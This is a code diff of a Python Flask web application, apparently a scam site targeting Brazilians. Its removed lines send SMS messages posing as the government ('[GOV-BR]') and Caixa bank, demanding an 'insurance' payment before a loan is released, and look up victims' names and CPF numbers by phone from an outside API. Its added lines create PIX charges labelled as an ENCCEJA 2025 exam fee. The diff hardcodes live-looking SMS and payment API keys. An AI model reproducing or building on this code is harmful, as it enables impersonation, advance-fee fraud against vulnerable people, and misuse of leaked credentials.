@@ -1,27 +1,21 @@
 import os
+import secrets
 import functools
-import time
-import re
+import json
 import random
 import string
-import json
-import http.client
-import subprocess
+import re
+import time
 import logging
-import urllib.parse
 from datetime import datetime
-from flask import Flask, render_template, request, jsonify, redirect, url_for, session, abort
-import secrets
-import qrcode
-import qrcode.constants
-import base64
-from io import BytesIO
+from urllib.parse import parse_qs, urlparse
+from flask import Flask, render_template, request, jsonify, redirect, url_for, session, make_response
 import requests
+import qrcode
+from io import BytesIO
+import base64
 
-from payment_gateway import get_payment_gateway
-from for4payments import create_payment_api
-from pagamentocomdesconto import create_payment_with_discount_api
-
+# Configurar Flask app
 app = Flask(__name__)
 
 # In-memory store for payment status (in production, use Redis or database)
@@ -48,382 +42,6 @@ app.secret_key = os.environ.get("SESSION_SECRET")
 # Configurar logging
 logging.basicConfig(level=logging.DEBUG)
 
-# Configuração para escolher qual API SMS usar: 'SMSDEV' ou 'OWEN'
-SMS_API_CHOICE = os.environ.get('SMS_API_CHOICE', 'OWEN')
-
-def send_verification_code_smsdev(phone_number: str, verification_code: str) -> tuple:
-    """
-    Sends a verification code via SMS using SMSDEV API
-    Returns a tuple of (success, error_message or None)
-    """
-    try:
-        # Usar a chave de API diretamente que foi testada e funcionou
-        sms_api_key = "XFOQ8HUF4XXDBN16IVGDCUMEM0R2V3N4J5AJCSI3G0KDVRGJ53WDBIWJGGS4LHJO38XNGJ9YW1Q7M2YS4OG7MJOZM3OXA2RJ8H0CBQH24MLXLUCK59B718OPBLLQM1H5"
-
-        # Format phone number (remove any non-digits)
-        formatted_phone = re.sub(r'\D', '', phone_number)
-
-        if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
-            # Message template
-            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."
-
-            # Verificamos se há uma URL no texto para encurtar
-            url_to_shorten = None
-            if "http://" in message or "https://" in message:
-                # Extrai a URL da mensagem
-                url_pattern = r'(https?://[^\s]+)'
-                url_match = re.search(url_pattern, message)
-                if url_match:
-                    url_to_shorten = url_match.group(0)
-                    app.logger.info(f"[PROD] URL detectada para encurtamento: {url_to_shorten}")
-
-            # API parameters
-            params = {
-                'key': sms_api_key,
-                'type': '9',
-                'number': formatted_phone,
-                'msg': message,
-                'short_url': '1'  # Sempre encurtar URLs encontradas na mensagem
-            }
-
-            # Make API request
-            response = requests.get('https://api.smsdev.com.br/v1/send', params=params)
-
-            # Log the response
-            app.logger.info(f"SMSDEV: Verification code sent to {formatted_phone}. Response: {response.text}")
-
-            if response.status_code == 200:
-                return True, None
-            else:
-                return False, f"API error: {response.text}"
-        else:
-            app.logger.error(f"Invalid phone number format: {phone_number}")
-            return False, "Número de telefone inválido"
-
-    except Exception as e:
-        app.logger.error(f"Error sending SMS via SMSDEV: {str(e)}")
-        return False, str(e)
-
-def send_verification_code_owen(phone_number: str, verification_code: str) -> tuple:
-    """
-    Sends a verification code via SMS using Owen SMS API v2
-    Returns a tuple of (success, error_message or None)
-    """
-    try:
-        # Get SMS API token from environment variables
-        sms_token = os.environ.get('SMS_OWEN_TOKEN')
-        if not sms_token:
-            app.logger.error("SMS_OWEN_TOKEN not found in environment variables")
-            return False, "API token not configured"
-
-        # Format phone number (remove any non-digits and add Brazil country code)
-        formatted_phone = re.sub(r'\D', '', phone_number)
-
-        if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
-            # Format as international number with Brazil code
-            international_number = f"55{formatted_phone}"
-
-            # Message template
-            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."
-
-            # Prepare the curl command
-            import subprocess
-
-            curl_command = [
-                'curl',
-                '--location',
-                'https://api.apisms.me/v2/sms/send',
-                '--header', 'Content-Type: application/json',
-                '--header', f'Authorization: {sms_token}',
-                '--data',
-                json.dumps({
-                    "operator": "claro",  # claro, vivo ou tim
-                    "destination_number": f"{international_number}",  # Número do destinatário com código internacional
-                    "message": message,  # Mensagem SMS com limite de 160 caracteres
-                    "tag": "VerificationCode",  # Tag para identificação do SMS
-                    "user_reply": False,  # Não receber resposta do destinatário
-                    "webhook_url": ""  # Opcional para callbacks
-                })
-            ]
-
-            # Execute curl command
-            app.logger.info(f"Enviando código de verificação para {international_number} usando curl")
-            payload = {
-                    'operator': 'claro',
-                    'destination_number': international_number,
-                    'message': message,
-                    'tag': 'VerificationCode',
-                    'user_reply': False,
-                    'webhook_url': ''
-                }
-            app.logger.info(f"JSON payload: {json.dumps(payload)}")
-                
-            process = subprocess.run(curl_command, capture_output=True, text=True)
-
-            # Log response
-            app.logger.info(f"OWEN SMS: Response for {international_number}: {process.stdout}")
-            app.logger.info(f"OWEN SMS: Error for {international_number}: {process.stderr}")
-
-            if process.returncode == 0 and "error" not in process.stdout.lower():
-                return True, None
-            else:
-                error_msg = process.stderr if process.stderr else process.stdout
-                return False, f"API error: {error_msg}"
-        else:
-            app.logger.error(f"Invalid phone number format: {phone_number}")
-            return False, "Número de telefone inválido"
-
-    except Exception as e:
-        app.logger.error(f"Error sending SMS via Owen SMS: {str(e)}")
-        return False, str(e)
-
-def send_verification_code(phone_number: str) -> tuple:
-    """
-    Sends a verification code via the selected SMS API
-    Returns a tuple of (success, code or error_message)
-    """
-    try:
-        # Generate random 4-digit code
-        verification_code = ''.join(random.choices('0123456789', k=4))
-
-        # Format phone number (remove any non-digits)
-        formatted_phone = re.sub(r'\D', '', phone_number)
-
-        if len(formatted_phone) != 11:
-            app.logger.error(f"Invalid phone number format: {phone_number}")
-            return False, "Número de telefone inválido (deve conter DDD + 9 dígitos)"
-
-        # Usar exclusivamente a API SMSDEV conforme solicitado
-        app.logger.info(f"[PROD] Usando exclusivamente a API SMSDEV para enviar código de verificação")
-        success, error = send_verification_code_smsdev(phone_number, verification_code)
-
-        if success:
-            return True, verification_code
-        else:
-            return False, error
-
-    except Exception as e:
-        app.logger.error(f"Error in send_verification_code: {str(e)}")
-        return False, str(e)
-
-def send_sms_smsdev(phone_number: str, message: str) -> bool:
-    """
-    Send SMS using SMSDEV API
-    """
-    try:
-        # Usar a chave de API diretamente que foi testada e funcionou
-        sms_api_key = "XFOQ8HUF4XXDBN16IVGDCUMEM0R2V3N4J5AJCSI3G0KDVRGJ53WDBIWJGGS4LHJO38XNGJ9YW1Q7M2YS4OG7MJOZM3OXA2RJ8H0CBQH24MLXLUCK59B718OPBLLQM1H5"
-        
-        # Format phone number (remove any non-digits and ensure it's in the correct format)
-        formatted_phone = re.sub(r'\D', '', phone_number)
-        if len(formatted_phone) == 11:  # Include DDD
-            # Verificamos se há uma URL no texto para encurtar
-            url_to_shorten = None
-            if "http://" in message or "https://" in message:
-                # Extrai a URL da mensagem
-                url_pattern = r'(https?://[^\s]+)'
-                url_match = re.search(url_pattern, message)
-                if url_match:
-                    url_to_shorten = url_match.group(0)
-                    app.logger.info(f"[PROD] URL detectada para encurtamento: {url_to_shorten}")
-            
-            # API parameters
-            params = {
-                'key': sms_api_key,
-                'type': '9',
-                'number': formatted_phone,
-                'msg': message,
-                'short_url': '1'  # Sempre encurtar URLs encontradas na mensagem
-            }
-
-            # Log detail antes do envio para depuração
-            app.logger.info(f"[PROD] Enviando SMS via SMSDEV para {formatted_phone} com encurtamento de URL ativado. Payload: {params}")
-
-            # Make API request with timeout
-            response = requests.get('https://api.smsdev.com.br/v1/send', params=params, timeout=10)
-            
-            # Analisar a resposta JSON se disponível
-            try:
-                response_data = response.json()
-                app.logger.info(f"[PROD] SMSDEV: SMS enviado para {formatted_phone}. Resposta: {response_data}")
-                
-                # Verificar se a mensagem foi colocada na fila
-                if response_data.get('situacao') == 'OK':
-                    app.logger.info(f"[PROD] SMS enviado com sucesso para {formatted_phone}, ID: {response_data.get('id')}")
-                    return True
-                else:
-                    app.logger.error(f"[PROD] Falha ao enviar SMS: {response_data}")
-                    return False
-            except Exception as json_err:
-                app.logger.error(f"[PROD] Erro ao analisar resposta JSON: {str(json_err)}")
-                # Se não conseguir parsear JSON, verificar apenas o status code
-                return response.status_code == 200
-        else:
-            app.logger.error(f"[PROD] Formato inválido de número de telefone: {phone_number} (formatado: {formatted_phone})")
-            return False
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro no envio de SMS via SMSDEV: {str(e)}")
-        return False
-
-def send_sms_owen(phone_number: str, message: str) -> bool:
-    """
-    Send SMS using Owen SMS API v2 with curl
-    """
-    try:
-        # Get SMS API token from environment variables
-        sms_token = os.environ.get('SMS_OWEN_TOKEN')
-        if not sms_token:
-            app.logger.error("SMS_OWEN_TOKEN not found in environment variables")
-            return False
-
-        # Format phone number (remove any non-digits and add Brazil country code)
-        formatted_phone = re.sub(r'\D', '', phone_number)
-        if len(formatted_phone) == 11:  # Include DDD
-            # Format as international number with Brazil code
-            international_number = f"55{formatted_phone}"
-
-            # Prepare and execute curl command
-            import subprocess
-
-            curl_command = [
-                'curl',
-                '--location',
-                'https://api.apisms.me/v2/sms/send',
-                '--header', 'Content-Type: application/json',
-                '--header', f'Authorization: {sms_token}',
-                '--data',
-                json.dumps({
-                    "operator": "claro",  # claro, vivo ou tim
-                    "destination_number": f"{international_number}",  # Número do destinatário com código internacional
-                    "message": message,  # Mensagem SMS com limite de 160 caracteres
-                    "tag": "LoanApproval",  # Tag para identificação do SMS
-                    "user_reply": False,  # Não receber resposta do destinatário
-                    "webhook_url": ""  # Opcional para callbacks
-                })
-            ]
-
-            # Execute curl command
-            app.logger.info(f"Enviando SMS para {international_number} usando curl")
-            payload = {
-                "operator": "claro",
-                "destination_number": international_number,
-                "message": message,
-                "tag": "LoanApproval",
-                "user_reply": False,
-                "webhook_url": ""
-            }
-            app.logger.info(f"JSON payload: {json.dumps(payload)}")
-            
-            process = subprocess.run(curl_command, capture_output=True, text=True)
-
-            # Log response
-            app.logger.info(f"OWEN SMS: Response for {international_number}: {process.stdout}")
-            app.logger.info(f"OWEN SMS: Error for {international_number}: {process.stderr}")
-
-            return process.returncode == 0 and "error" not in process.stdout.lower()
-        else:
-            app.logger.error(f"Invalid phone number format: {phone_number}")
-            return False
-    except Exception as e:
-        app.logger.error(f"Error sending SMS via Owen SMS: {str(e)}")
-        return False
-
-def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
-    try:
-        # Get first name
-        first_name = full_name.split()[0]
-
-        # Format phone number (remove any non-digits)
-        formatted_phone = re.sub(r'\D', '', phone_number)
-
-        if len(formatted_phone) != 11:
-            app.logger.error(f"Invalid phone number format: {phone_number}")
-            return False
-
-        # Message template
-        message = f"[GOV-BR] {first_name}, estamos aguardando o pagamento do seguro no valor R${amount:.2f} para realizar a transferencia PIX do emprestimo para a sua conta bancaria."
-
-        # Usar exclusivamente a API SMSDEV conforme solicitado
-        app.logger.info(f"[PROD] Usando exclusivamente a API SMSDEV para enviar SMS")
-        return send_sms_smsdev(phone_number, message)
-    except Exception as e:
-        app.logger.error(f"Error in send_sms: {str(e)}")
-        return False
-        
-def send_payment_confirmation_sms(phone_number: str, nome: str, cpf: str, thank_you_url: str) -> bool:
-    """
-    Envia SMS de confirmação de pagamento com link personalizado para a página de agradecimento
-    """
-    try:
-        if not phone_number:
-            app.logger.error("[PROD] Número de telefone não fornecido para SMS de confirmação")
-            return False
-            
-        # Format phone number (remove any non-digits)
-        formatted_phone = re.sub(r'\D', '', phone_number)
-        
-        if len(formatted_phone) != 11:
-            app.logger.error(f"[PROD] Formato inválido de número de telefone: {phone_number}")
-            return False
-            
-        # Formata CPF para exibição (XXX.XXX.XXX-XX)
-        cpf_formatado = format_cpf(cpf) if cpf else ""
-        
-        # Criar mensagem personalizada com link para thank_you_url
-        nome_formatado = nome.split()[0] if nome else "Cliente"  # Usar apenas o primeiro nome
-        
-        # Garantir que a URL está codificada corretamente
-        # Se a URL ainda não estiver codificada, o API SMSDEV pode não encurtá-la completamente
-        import urllib.parse
-        # Verificar se a URL já foi codificada verificando se tem caracteres de escape como %20
-        if '%' not in thank_you_url and (' ' in thank_you_url or '&' in thank_you_url):
-            # Extrair a base da URL e os parâmetros
-            if '?' in thank_you_url:
-                base_url, query_part = thank_you_url.split('?', 1)
-                params = {}
-                for param in query_part.split('&'):
-                    if '=' in param:
-                        key, value = param.split('=', 1)
-                        params[key] = value
-                
-                # Recriar a URL com parâmetros codificados
-                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
-                thank_you_url = f"{base_url}?{query_string}"
-                app.logger.info(f"[PROD] URL recodificada para SMS: {thank_you_url}")
-        
-        # Mensagem mais informativa para o cliente
-        message = f"[CAIXA]: {nome_formatado}, para receber o seu emprestimo resolva as pendencias urgentemente: {thank_you_url}"
-        
-        # Log detalhado para debugging
-        app.logger.info(f"[PROD] Enviando SMS para {phone_number} com mensagem: '{message}'")
-        
-        # Fazer várias tentativas de envio para maior garantia
-        max_attempts = 3
-        attempt = 0
-        success = False
-        
-        while attempt < max_attempts and not success:
-            attempt += 1
-            try:
-                # Usar exclusivamente a API SMSDEV para confirmação de pagamento
-                app.logger.info(f"[PROD] Usando exclusivamente a API SMSDEV para enviar SMS de confirmação")
-                success = send_sms_smsdev(phone_number, message)
-                
-                if success:
-                    app.logger.info(f"[PROD] SMS enviado com sucesso na tentativa {attempt} via SMSDEV")
-                    break
-                else:
-                    app.logger.warning(f"[PROD] Falha ao enviar SMS na tentativa {attempt}/{max_attempts} via SMSDEV")
-                    time.sleep(1.0)  # Aumentando o intervalo entre tentativas
-            except Exception as e:
-                app.logger.error(f"[PROD] Erro na tentativa {attempt} com SMSDEV: {str(e)}")
-        
-        return success
-
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro no envio de SMS de confirmação: {str(e)}")
-        return False
-
 def generate_random_email(name: str) -> str:
     clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
     random_number = ''.join(random.choices(string.digits, k=4))
@@ -438,1356 +56,106 @@ def format_cpf(cpf: str) -> str:
 def generate_random_phone():
     ddd = str(random.randint(11, 99))
     number = ''.join(random.choices(string.digits, k=8))
-    return f"{ddd}{number}"
+    return f"({ddd}) {number[:4]}-{number[4:]}"
 
-def generate_qr_code(pix_code: str) -> str:
-    # Importar o QRCode dentro da função para garantir que a biblioteca está disponível
-    import qrcode
-    from qrcode import constants
-    
-    qr = qrcode.QRCode(
-        version=1,
-        error_correction=constants.ERROR_CORRECT_L,
-        box_size=10,
-        border=4,
-    )
-    qr.add_data(pix_code)
-    qr.make(fit=True)
+def generate_transaction_id():
+    """Gera um ID de transação único para o pagamento"""
+    timestamp = str(int(time.time()))
+    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+    return f"TX{timestamp}{random_part}"
 
-    img = qr.make_image(fill_color="black", back_color="white")
-    buffered = BytesIO()
-    img.save(buffered, format="PNG")
-    img_str = base64.b64encode(buffered.getvalue()).decode()
-    return f"data:image/png;base64,{img_str}"
-
-@app.route('/')
-@app.route('/index')
-@check_referer
-def index():
-    """Página principal - redireciona para /inscricao"""
-    return redirect(url_for('inscricao'))
-
-@app.route('/index-old')
-@check_referer
-def index_old():
+def create_witepay_payment(amount: float, user_data: dict, description: str = "Taxa de Inscrição ENCCEJA 2025") -> dict:
+    """
+    Cria um pagamento PIX via WitePay API
+    """
     try:
-        # Get data from query parameters for backward compatibility
-        customer_data = {
-            'nome': request.args.get('nome', ''),
-            'cpf': request.args.get('cpf', ''),
-            'phone': request.args.get('phone', '')
+        # Usar as credenciais WitePay fornecidas pelo usuário
+        api_key = "sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d"
+        
+        # Order creation
+        order_url = "https://api.witepay.com/v1/order/create"
+        order_headers = {
+            "Content-Type": "application/json",
+            "Authorization": f"Bearer {api_key}"
         }
         
-        # Verificar se temos um número de telefone no UTM content
-        utm_source = request.args.get('utm_source', '')
-        utm_content = request.args.get('utm_content', '')
-        phone_from_utm = None
-        
-        # Extrair número de telefone do utm_content
-        if utm_content and len(utm_content) >= 10:
-            # Limpar o número de telefone, mantendo apenas dígitos
-            phone_from_utm = re.sub(r'\D', '', utm_content)
-            app.logger.info(f"[PROD] Número de telefone extraído de utm_content: {phone_from_utm}")
-            
-            # Salvar o número do utm_content para uso posterior
-            if phone_from_utm:
-                customer_data['phone'] = phone_from_utm
-                
-                # Buscar dados do cliente na API externa
-                try:
-                    # Acessar a API real fornecida conforme especificado
-                    api_url = f"https://webhook-manager.replit.app/api/v1/cliente?telefone={phone_from_utm}"
-                    app.logger.info(f"[PROD] Consultando API de cliente: {api_url}")
-                    
-                    response = requests.get(api_url, timeout=5)
-                    if response.status_code == 200:
-                        api_response = response.json()
-                        app.logger.info(f"[PROD] Dados do cliente obtidos da API: {api_response}")
-                        
-                        # Extrair os dados do cliente da resposta da API
-                        if api_response.get('sucesso') and 'cliente' in api_response:
-                            cliente_data = api_response['cliente']
-                            client_data = {
-                                'name': cliente_data.get('nome', 'Cliente Promocional'),
-                                'cpf': cliente_data.get('cpf', ''),
-                                'phone': cliente_data.get('telefone', phone_from_utm).replace('+55', ''),
-                                'email': cliente_data.get('email', f"cliente_{phone_from_utm}@example.com")
-                            }
-                            
-                            # Usar os dados obtidos da API para gerar uma transação com pagamentocomdesconto.py
-                            api_desconto = create_payment_with_discount_api()
-                            
-                            # Preparar dados para a API
-                            payment_data = {
-                                'nome': client_data['name'],
-                                'cpf': client_data['cpf'],
-                                'telefone': client_data['phone'],
-                                'email': client_data['email']
-                            }
-                            
-                            # Criar o pagamento PIX com desconto
-                            try:
-                                pix_data = api_desconto.create_pix_payment_with_discount(payment_data)
-                                app.logger.info(f"[PROD] PIX com desconto gerado com sucesso: {pix_data}")
-                                
-                                # Obter QR code e PIX code da resposta da API
-                                qr_code = pix_data.get('pix_qr_code') or pix_data.get('pixQrCode')
-                                pix_code = pix_data.get('pix_code') or pix_data.get('pixCode')
-                                
-                                # Garantir que temos valores válidos
-                                if not qr_code:
-                                    # Algumas APIs podem usar outros nomes para o QR code
-                                    qr_code = pix_data.get('qr_code_image') or pix_data.get('qr_code') or ''
-                                    
-                                if not pix_code:
-                                    # Algumas APIs podem usar outros nomes para o código PIX
-                                    pix_code = pix_data.get('copy_paste') or pix_data.get('code') or ''
-                                
-                                return render_template('payment_update.html', 
-                                    qr_code=qr_code,
-                                    pix_code=pix_code, 
-                                    nome=client_data['name'], 
-                                    cpf=format_cpf(client_data['cpf']),
-                                    phone=client_data['phone'],
-                                    transaction_id=pix_data.get('id'),
-                                    amount=49.70)
-                                
-                            except Exception as pix_error:
-                                app.logger.error(f"[PROD] Erro ao gerar PIX com desconto: {str(pix_error)}")
-                                # Continua com o fluxo normal em caso de erro no pagamento
-                        else:
-                            # Tente o endpoint alternativo se o primeiro falhar
-                            app.logger.warning(f"[PROD] API primária não retornou dados esperados, tentando endpoint alternativo")
-                            api_url_alt = f"https://webhook-manager.replit.app/api/customer/{phone_from_utm}"
-                            response_alt = requests.get(api_url_alt, timeout=5)
-                            
-                            if response_alt.status_code == 200:
-                                api_data = response_alt.json()
-                                app.logger.info(f"[PROD] Dados do cliente obtidos da API alternativa: {api_data}")
-                                
-                                client_data = {
-                                    'name': api_data.get('name', 'Cliente Promocional'),
-                                    'cpf': api_data.get('cpf', ''),
-                                    'phone': phone_from_utm,
-                                    'email': api_data.get('email', f"cliente_{phone_from_utm}@example.com")
-                                }
-                            else:
-                                app.logger.warning(f"[PROD] Ambos endpoints de API falharam")
-                                # Não gera erro, apenas continua com o fluxo normal
-                    
-                    # Atualizar dados do cliente que serão mostrados na página
-                    if 'client_data' in locals():
-                        customer_data['nome'] = client_data['name']
-                        customer_data['cpf'] = client_data['cpf']
-                        customer_data['phone'] = client_data['phone']
-                        customer_data['email'] = client_data.get('email', '')
-                        
-                        # Marcar que este cliente tem desconto
-                        customer_data['has_discount'] = True
-                        customer_data['discount_price'] = 49.70
-                        customer_data['regular_price'] = 93.40
-                    
-                except Exception as api_error:
-                    app.logger.error(f"[PROD] Erro ao processar dados do cliente: {str(api_error)}")
-        
-        app.logger.info(f"[PROD] Renderizando página inicial para: {customer_data}")
-        return render_template('index.html', customer=customer_data, 
-                              has_discount='client_data' in locals(),
-                              discount_price=49.70,
-                              regular_price=93.40)
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro na rota index: {str(e)}")
-        return jsonify({'error': 'Erro interno do servidor'}), 500
-
-@app.route('/payment')
-@check_referer
-def payment():
-    try:
-        app.logger.info("[PROD] Iniciando geração de PIX...")
-
-        # Obter dados do usuário da query string
-        nome = request.args.get('nome')
-        cpf = request.args.get('cpf')
-        phone = request.args.get('phone')  # Get phone from query params
-        source = request.args.get('source', 'index')
-        has_discount = request.args.get('has_discount', 'false').lower() == 'true'
-
-        if not nome or not cpf:
-            app.logger.error("[PROD] Nome ou CPF não fornecidos")
-            return jsonify({'error': 'Nome e CPF são obrigatórios'}), 400
-
-        app.logger.info(f"[PROD] Dados do cliente: nome={nome}, cpf={cpf}, phone={phone}, source={source}, has_discount={has_discount}")
-
-        # Formata o CPF removendo pontos e traços
-        cpf_formatted = ''.join(filter(str.isdigit, cpf))
-
-        # Gera um email aleatório baseado no nome do cliente
-        customer_email = generate_random_email(nome)
-
-        # Use provided phone if available, otherwise generate random
-        customer_phone = ''.join(filter(str.isdigit, phone)) if phone else generate_random_phone()
-
-        # Define o valor baseado na origem e se tem desconto
-        if has_discount:
-            # Preço com desconto para clientes que vieram do SMS
-            amount = 49.70
-            app.logger.info(f"[PROD] Cliente com DESCONTO PROMOCIONAL, valor: {amount}")
-            
-            # Usar especificamente a API FOR4 para pagamentos com desconto
-            from for4payments import create_payment_api as create_for4_api
-            api = create_for4_api()
-            
-            # Dados para a transação (ajustados para FOR4 API)
-            payment_data = {
-                'name': nome,
-                'email': customer_email,
-                'cpf': cpf_formatted,
-                'phone': customer_phone,
-                'amount': amount
-            }
-            
-            # Cria o pagamento PIX usando FOR4 API
-            pix_data = api.create_pix_payment(payment_data)
-            
-        else:
-            # Preço normal, sem desconto
-            if source == 'insurance':
-                amount = 47.60  # Valor fixo para o seguro
-            elif source == 'index':
-                amount = 142.83
-            else:
-                amount = 93.40
-                
-            # Usar especificamente a API FOR4 para pagamentos
-            from for4payments import create_payment_api as create_for4_api
-            api = create_for4_api()
-                
-            # Dados para a transação
-            payment_data = {
-                'name': nome,
-                'email': customer_email,
-                'cpf': cpf_formatted,
-                'phone': customer_phone,
-                'amount': amount
-            }
-            
-            # Cria o pagamento PIX
-            pix_data = api.create_pix_payment(payment_data)
-
-        app.logger.info(f"[PROD] Dados do pagamento: {payment_data}")
-        app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")
-
-        # Send SMS notification if we have a valid phone number
-        if phone:
-            send_sms(phone, nome, amount)
-
-        # Obter QR code e PIX code da resposta da API (adaptado para a estrutura da API NovaEra)
-        # O QR code na NovaEra vem como URL para geração externa
-        qr_code = pix_data.get('pix_qr_code')  # URL já formada para API externa
-        pix_code = pix_data.get('pix_code')    # Código PIX para copiar e colar
-        
-        # Log detalhado para depuração
-        app.logger.info(f"[PROD] Dados PIX recebidos da API: {pix_data}")
-        
-        # Garantir que temos valores válidos para exibição
-        if not qr_code and pix_code:
-            # Gerar QR code com biblioteca qrcode se tivermos o código PIX mas não o QR
-            import qrcode
-            from qrcode import constants
-            qr = qrcode.QRCode(version=1, box_size=10, border=5)
-            qr.add_data(pix_code)
-            qr.make(fit=True)
-            img = qr.make_image(fill_color="black", back_color="white")
-            buffered = BytesIO()
-            img.save(buffered, format="PNG")
-            qr_code = "data:image/png;base64," + base64.b64encode(buffered.getvalue()).decode()
-            app.logger.info("[PROD] QR code gerado localmente a partir do código PIX")
-            
-        # Verificar possíveis nomes alternativos para o código PIX caso esteja faltando
-        if not pix_code:
-            pix_code = pix_data.get('copy_paste') or pix_data.get('code') or ''
-            app.logger.info("[PROD] Código PIX obtido de campo alternativo")
-        
-        # Log detalhado para depuração
-        app.logger.info(f"[PROD] QR code: {qr_code[:50]}... (truncado)")
-        app.logger.info(f"[PROD] PIX code: {pix_code[:50]}... (truncado)")
-            
-        return render_template('payment.html', 
-                         qr_code=qr_code,
-                         pix_code=pix_code, 
-                         nome=nome, 
-                         cpf=format_cpf(cpf),
-                         phone=phone,  # Adicionando o telefone para o template
-                         transaction_id=pix_data.get('id'),
-                         amount=amount)
-
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro ao gerar PIX: {str(e)}")
-        if hasattr(e, 'args') and len(e.args) > 0:
-            return jsonify({'error': str(e.args[0])}), 500
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/payment-update')
-@check_referer
-def payment_update():
-    try:
-        app.logger.info("[PROD] Iniciando geração de PIX para atualização cadastral...")
-
-        # Obter dados do usuário da query string
-        nome = request.args.get('nome')
-        cpf = request.args.get('cpf')
-        phone = request.args.get('phone', '') # Adicionar parâmetro phone
-
-        if not nome or not cpf:
-            app.logger.error("[PROD] Nome ou CPF não fornecidos")
-            return jsonify({'error': 'Nome e CPF são obrigatórios'}), 400
-
-        app.logger.info(f"[PROD] Dados do cliente para atualização: nome={nome}, cpf={cpf}, phone={phone}")
-
-        # Inicializa a API usando nossa factory
-        api = get_payment_gateway()
-
-        # Formata o CPF removendo pontos e traços
-        cpf_formatted = ''.join(filter(str.isdigit, cpf))
-
-        # Gera um email aleatório baseado no nome do cliente
-        customer_email = generate_random_email(nome)
-
-        # Usa o telefone informado pelo usuário ou gera um se não estiver disponível
-        if not phone:
-            phone = generate_random_phone()
-            app.logger.info(f"[PROD] Telefone não fornecido, gerando aleatório: {phone}")
-        else:
-            # Remover caracteres não numéricos do telefone
-            phone = ''.join(filter(str.isdigit, phone))
-            app.logger.info(f"[PROD] Usando telefone fornecido pelo usuário: {phone}")
-
-        # Dados para a transação
-        payment_data = {
-            'name': nome,
-            'email': customer_email,
-            'cpf': cpf_formatted,
-            'phone': phone,
-            'amount': 93.40  # Valor fixo para atualização cadastral
-        }
-
-        app.logger.info(f"[PROD] Dados do pagamento de atualização: {payment_data}")
-
-        # Cria o pagamento PIX
-        pix_data = api.create_pix_payment(payment_data)
-
-        app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")
-
-        # Obter QR code e PIX code da resposta da API
-        qr_code = pix_data.get('pix_qr_code')
-        pix_code = pix_data.get('pix_code')
-        
-        # Garantir que temos valores válidos
-        if not qr_code:
-            # Algumas APIs podem usar outros nomes para o QR code
-            qr_code = pix_data.get('qr_code_image') or pix_data.get('qr_code') or pix_data.get('pixQrCode') or ''
-            
-        if not pix_code:
-            # Algumas APIs podem usar outros nomes para o código PIX
-            pix_code = pix_data.get('copy_paste') or pix_data.get('code') or pix_data.get('pixCode') or ''
-        
-        # Log detalhado para depuração
-        app.logger.info(f"[PROD] QR code: {qr_code[:50]}... (truncado)")
-        app.logger.info(f"[PROD] PIX code: {pix_code[:50]}... (truncado)")
-            
-        return render_template('payment_update.html', 
-                         qr_code=qr_code,
-                         pix_code=pix_code, 
-                         nome=nome, 
-                         cpf=format_cpf(cpf),
-                         phone=phone,  # Passando o telefone para o template
-                         transaction_id=pix_data.get('id'),
-                         amount=93.40)
-
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro ao gerar PIX: {str(e)}")
-        if hasattr(e, 'args') and len(e.args) > 0:
-            return jsonify({'error': str(e.args[0])}), 500
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/check-payment-status/<transaction_id>')
-@check_referer
-def check_payment_status(transaction_id):
-    try:
-        # Obter informações do usuário da sessão se disponíveis
-        nome = request.args.get('nome', '')
-        cpf = request.args.get('cpf', '')
-        phone = request.args.get('phone', '')
-        
-        # Logs detalhados de entrada para depuração
-        app.logger.info(f"[PROD] Verificando status do pagamento {transaction_id} para cliente: nome={nome}, cpf={cpf}, phone={phone}")
-        
-        # Validar dados do cliente
-        if not nome or not cpf:
-            app.logger.warning(f"[PROD] Dados incompletos do cliente ao verificar pagamento. nome={nome}, cpf={cpf}")
-        
-        if not phone:
-            app.logger.warning(f"[PROD] Telefone não fornecido para envio de SMS de confirmação: {transaction_id}")
-        else:
-            formatted_phone = re.sub(r'\D', '', phone)
-            if len(formatted_phone) != 11:
-                app.logger.warning(f"[PROD] Formato de telefone inválido: {phone} (formatado: {formatted_phone})")
-            else:
-                app.logger.info(f"[PROD] Telefone válido para SMS: {formatted_phone}")
-        
-        # Verificar status na API de pagamento
-        api = get_payment_gateway()
-        status_data = api.check_payment_status(transaction_id)
-        app.logger.info(f"[PROD] Status do pagamento {transaction_id}: {status_data}")
-        
-        # Verificar se o pagamento foi aprovado
-        is_completed = status_data.get('status') == 'completed'
-        is_approved = status_data.get('original_status') in ['APPROVED', 'PAID']
-        
-        # Construir o URL personalizado para a página de agradecimento (sempre criar, independentemente do status)
-        thank_you_url = request.url_root.rstrip('/') + '/obrigado'
-        
-        # Obter dados adicionais (banco, chave PIX e valor do empréstimo)
-        bank = request.args.get('bank', 'Caixa Econômica Federal')
-        pix_key = request.args.get('pix_key', cpf if cpf else '')
-        loan_amount = request.args.get('loan_amount', '4000')
-        
-        if is_completed or is_approved:
-            app.logger.info(f"[PROD] PAGAMENTO APROVADO: {transaction_id} - Status: {status_data.get('status')}, Original Status: {status_data.get('original_status')}")
-            
-            # Adicionar parâmetros do usuário, se disponíveis
-            params = {
-                'nome': nome if nome else '',
-                'cpf': cpf if cpf else '',
-                'phone': phone if phone else '',
-                'bank': bank,
-                'pix_key': pix_key,
-                'loan_amount': loan_amount,
-                'utm_source': 'smsempresa',
-                'utm_medium': 'sms',
-                'utm_campaign': '',
-                'utm_content': phone if phone else ''
-            }
-                
-            # Construir a URL completa com parâmetros codificados corretamente para evitar problemas de encurtamento
-            if params:
-                # Usar urllib para codificar os parâmetros corretamente
